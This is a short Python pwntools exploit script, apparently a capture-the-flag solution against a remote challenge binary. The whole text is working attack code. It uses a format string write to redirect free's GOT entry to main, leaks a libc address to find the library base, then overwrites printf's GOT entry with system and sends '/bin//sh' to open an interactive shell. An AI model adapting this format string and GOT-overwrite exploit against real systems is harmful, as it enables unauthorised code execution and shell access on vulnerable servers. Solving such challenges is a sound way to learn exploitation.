from pwn import *

context(arch='i386')
bin = ELF('./hello')
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('./libc.so.6')
p = remote('chall.csivit.com', 30046)

# p = process('./hello')

write = {bin.got['free']: bin.symbols['main']}

payload = fmtstr_payload(1, write) + b'aaa %31$p'
p.recvuntil('name?\n')
p.sendline(payload)

p.recvuntil('aaa ')
leak = int(p.recv(10), 16)
libc.address = leak - 0x1b0000  # remote
# libc.address = leak - 0x1e0000  # local
log.info("Base: " + hex(libc.address))

write = {bin.got['free']: bin.symbols['main'],
         bin.got['printf']: libc.symbols['system']}

payload = fmtstr_payload(1, write)
p.recvuntil('name?\n')
p.sendline(payload)
p.recvuntil('name?\n')
p.sendline("/bin//sh")
p.interactive()
